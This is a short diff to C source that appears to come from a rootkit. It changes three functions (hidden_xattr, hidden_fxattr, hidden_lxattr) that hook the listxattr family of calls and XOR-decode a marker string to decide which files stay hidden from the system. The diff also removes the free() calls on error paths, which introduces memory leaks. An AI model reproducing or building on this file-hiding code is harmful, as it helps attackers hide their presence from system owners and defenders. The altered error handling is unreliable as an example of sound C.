@@ -34,7 +34,7 @@ int hidden_xattr(const char *filename)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_listxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; } // fuuuck
+    if((buflen = old_listxattr(filename, buf, buflen)) == -1) return 0; // fuuuck
 
     char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
 
@@ -67,7 +67,7 @@ int hidden_fxattr(int fd)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }
+    if((buflen = old_flistxattr(fd, buf, buflen)) == -1) return 0;
 
     char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
 
@@ -100,7 +100,7 @@ int hidden_lxattr(const char *filename)
     else if(buflen == 0) return 0;
 
     buf = malloc(buflen);
-    if((buflen = old_llistxattr(filename, buf, buflen)) == -1) { if(buf) { free(buf); } return 0; }
+    if((buflen = old_llistxattr(filename, buf, buflen)) == -1) return 0;
 
     char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR); xor(hidden_xattr_1_str);
 
